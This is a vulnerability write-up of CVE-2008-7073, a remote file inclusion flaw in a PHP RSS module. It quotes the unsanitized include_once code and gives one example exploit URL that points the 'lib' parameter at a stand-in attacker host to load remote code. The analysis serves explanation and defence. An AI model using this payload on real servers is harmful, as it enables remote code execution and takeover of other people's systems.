Based on the provided information, here's an analysis of the vulnerability:

**CVE ID:** CVE-2008-7073

**Root Cause of Vulnerability:**
The vulnerability is a Remote File Inclusion (RFI) vulnerability. The `rss.php` file in the Pie Web M{a,e}sher Mod Rss 0.1 module uses an unsanitized `$lib` variable in an `include_once` statement, allowing an attacker to include remote files.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The application includes files based on user-supplied input without proper sanitization, leading to the inclusion of arbitrary remote files. The vulnerable code snippet is:
```php
include_once("$lib/class/page.php");
include_once("$lib/share/link.php");
include_once("$lib/share/stdio.php");
include_once("$lib/share/string.php");
```

**Impact of Exploitation:**
- **Remote Code Execution (RCE):** By including a malicious file from a remote server, an attacker can execute arbitrary code on the vulnerable server, potentially gaining full control over the system. This allows for a wide range of malicious activities including data theft, modification and system takeover.

**Attack Vectors:**
- **HTTP GET parameter manipulation:** The attacker injects a malicious URL into the `lib` parameter of the `rss.php` file.
Example: `http://localhost/script/[pie installation]/lib/action/rss.php?lib=http://evil.com/malicious_file.txt?`

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs network access to the vulnerable server.
- **Basic knowledge of HTTP and web applications:** The attacker needs to understand how to manipulate GET parameters to inject the malicious file.
- **Accessible remote server:** The attacker needs access to a web server hosting the malicious file that will be included by the vulnerable script.
